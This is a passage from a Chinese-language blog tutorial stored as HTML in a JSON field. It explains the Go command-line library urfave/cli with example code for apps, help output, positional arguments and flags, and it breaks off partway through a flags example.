            "content_html": "<h1 id=\"urfave-cli\"><a class=\"anchor\" href=\"#urfave-cli\">#</a> urfave cli</h1>\n<p>参考资料</p>\n<p>urfave cli 官网：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbGkudXJmYXZlLm9yZy8=\">https://cli.urfave.org/</span></p>\n<p>urfave cli github: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3VyZmF2ZS9jbGk=\">https://github.com/urfave/cli</span></p>\n<p>photoprism (cli 用法参考) : <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Bob3RvcHJpc20vcGhvdG9wcmlzbQ==\">https://github.com/photoprism/photoprism</span></p>\n<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p><a href=\"https://github.com/urfave/cli\"> <code>cli</code> </a> 是一个用于构建命令行程序的库。</p>\n<h1 id=\"快速开始\"><a class=\"anchor\" href=\"#快速开始\">#</a> 快速开始</h1>\n<p>安装 <code>cli</code>  库，有 <code>v1</code>  和 <code>v2</code>  两个版本。如果没有特殊需求，一般安装 <code>v2</code>  版本：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ go get <span class=\"token parameter variable\">-u</span> github.com/urfave/cli/v2</pre></td></tr></table></figure><p><strong>使用</strong></p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> main</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token string\">\"fmt\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token string\">\"log\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token string\">\"os\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token string\">\"github.com/urfave/cli/v2\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  app <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>App<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    Name<span class=\"token punctuation\">:</span>  <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    Usage<span class=\"token punctuation\">:</span> <span class=\"token string\">\"hello world example\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    Action<span class=\"token punctuation\">:</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello world\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    log<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>运行</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 运行</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$go</span> run main.go</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 编译后运行</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$go</span> build <span class=\"token parameter variable\">-o</span> hello</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>$./hello</pre></td></tr></table></figure><p><code>cli</code>  会为我们额外生成了帮助信息：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ ./hello <span class=\"token parameter variable\">--help</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>NAME:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   hello - hello world example</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>USAGE:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   hello <span class=\"token punctuation\">[</span>global options<span class=\"token punctuation\">]</span> <span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">[</span>command options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>arguments<span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>COMMANDS:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   help, h  Shows a list of commands or <span class=\"token builtin class-name\">help</span> <span class=\"token keyword\">for</span> one <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>GLOBAL OPTIONS:</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   --help, <span class=\"token parameter variable\">-h</span>  show <span class=\"token builtin class-name\">help</span> <span class=\"token punctuation\">(</span>default: <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"帮助信息\"><a class=\"anchor\" href=\"#帮助信息\">#</a> 帮助信息</h1>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> version <span class=\"token operator\">=</span> <span class=\"token string\">\"v0.0.1 development\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">var</span> log <span class=\"token operator\">=</span> zerolog<span class=\"token punctuation\">.</span><span class=\"token function\">New</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stderr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">With</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Timestamp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Logger</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">const</span> appName <span class=\"token operator\">=</span> <span class=\"token string\">\"AliyunLogAnalysis\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">const</span> appAbout <span class=\"token operator\">=</span> <span class=\"token string\">\"Twelveeee\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">const</span> appDescription <span class=\"token operator\">=</span> <span class=\"token string\">\"阿里云日志分析\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">const</span> appCopyright <span class=\"token operator\">=</span> <span class=\"token string\">\"(c) 2023 Twelveeee @ Twelveeee\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// Metadata contains build specific information.</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">var</span> Metadata <span class=\"token operator\">=</span> <span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">:</span>        appName<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token string\">\"About\"</span><span class=\"token punctuation\">:</span>       appAbout<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token string\">\"Description\"</span><span class=\"token punctuation\">:</span> appDescription<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span>     version<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">defer</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> r <span class=\"token operator\">:=</span> <span class=\"token function\">recover</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> r <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Err</span><span class=\"token punctuation\">(</span>errors<span class=\"token punctuation\">.</span><span class=\"token function\">New</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\tos<span class=\"token punctuation\">.</span><span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tapp <span class=\"token operator\">:=</span> cli<span class=\"token punctuation\">.</span><span class=\"token function\">NewApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Usage <span class=\"token operator\">=</span> appAbout</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Description <span class=\"token operator\">=</span> appDescription</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Version <span class=\"token operator\">=</span> version</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Copyright <span class=\"token operator\">=</span> appCopyright</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>EnableBashCompletion <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Flags <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>Flags<span class=\"token punctuation\">.</span><span class=\"token function\">Cli</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Commands <span class=\"token operator\">=</span> command<span class=\"token punctuation\">.</span>Commands</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Metadata <span class=\"token operator\">=</span> Metadata</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token comment\">// app.UseShortOptionHandling = true</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tzerolog<span class=\"token punctuation\">.</span><span class=\"token function\">SetGlobalLevel</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tzerolog<span class=\"token punctuation\">.</span>TimeFieldFormat <span class=\"token operator\">=</span> zerolog<span class=\"token punctuation\">.</span>TimeFormatUnix</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Msg</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"start app\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Err</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Msg</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"run error\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$go</span> run main.go</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>NAME:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   main - Twelveeee</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>USAGE:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   main <span class=\"token punctuation\">[</span>global options<span class=\"token punctuation\">]</span> <span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">[</span>command options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>arguments<span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>VERSION:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   v0.0.1 development</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>DESCRIPTION:</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   阿里云日志分析</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>COMMANDS:</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   start, up      Starts the server</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   startDay, upd  Starts the server with start day and end day</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   help, h        Shows a list of commands or <span class=\"token builtin class-name\">help</span> <span class=\"token keyword\">for</span> one <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>GLOBAL OPTIONS:</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   --help, <span class=\"token parameter variable\">-h</span>     show <span class=\"token builtin class-name\">help</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   --version, <span class=\"token parameter variable\">-v</span>  print the version</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>COPYRIGHT:</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   <span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token number\">2023</span> Twelveeee @ Twelveeee</pre></td></tr></table></figure><h1 id=\"参数\"><a class=\"anchor\" href=\"#参数\">#</a> 参数</h1>\n<p>通过 <code>cli.Context</code>  的相关方法我们可以获取传给命令行的参数信息：</p>\n<ul>\n<li><code>NArg()</code> ：返回参数个数；</li>\n<li><code>Args()</code> ：返回 <code>cli.Args</code>  对象，调用其 <code>Get(i)</code>  获取位置 <code>i</code>  上的参数。</li>\n</ul>\n<p>参数是指</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$go</span> run main.go  fff <span class=\"token parameter variable\">--lang</span> spanish</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 其中 fff --lang spanish 均为参数 都可以通过 Args ().Get (i) 进行获取</span></pre></td></tr></table></figure><p>示例：</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  app <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>App<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Name<span class=\"token punctuation\">:</span>  <span class=\"token string\">\"arguments\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    Usage<span class=\"token punctuation\">:</span> <span class=\"token string\">\"arguments example\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    Action<span class=\"token punctuation\">:</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">NArg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d: %s\\n\"</span><span class=\"token punctuation\">,</span> i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">Args</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    log<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$go</span> run main.go  fff <span class=\"token parameter variable\">--lang</span> spanish</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">1</span>: fff</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">2</span>: <span class=\"token parameter variable\">--lang</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">3</span>: spanish</pre></td></tr></table></figure><h1 id=\"选项\"><a class=\"anchor\" href=\"#选项\">#</a> 选项</h1>\n<p><code>Flags</code>  字段是 <code>[]cli.Flag</code>  类型， <code>cli.Flag</code>  实际上是接口类型。 <code>cli</code>  为常见类型都实现了对应的 <code>XxxFlag</code> ，如 <code>BoolFlag/DurationFlag/StringFlag</code>  等。它们有一些共用的字段， <code>Name/Value/Usage</code> （名称 / 默认值 / 释义）。</p>\n<p>示例：</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tapp <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>App<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\tFlags<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>cli<span class=\"token punctuation\">.</span>Flag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t\t<span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>StringFlag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\t\tName<span class=\"token punctuation\">:</span>  <span class=\"token string\">\"lang\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\t\tValue<span class=\"token punctuation\">:</span> <span class=\"token string\">\"english\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\t\tUsage<span class=\"token punctuation\">:</span> <span class=\"token string\">\"language for the greeting\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\tAction<span class=\"token punctuation\">:</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>cCtx <span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\tname <span class=\"token operator\">:=</span> <span class=\"token string\">\"Nefertiti\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Msg</span><span class=\"token punctuation\">(</span>strconv<span class=\"token punctuation\">.</span><span class=\"token function\">Itoa</span><span class=\"token punctuation\">(</span>cCtx<span class=\"token punctuation\">.</span><span class=\"token function\">NArg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> cCtx<span class=\"token punctuation\">.</span><span class=\"token function\">NArg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t\tname <span class=\"token operator\">=</span> cCtx<span class=\"token punctuation\">.</span><span class=\"token function\">Args</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> cCtx<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"lang\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"spanish\"</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hola\"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Err</span><span class=\"token 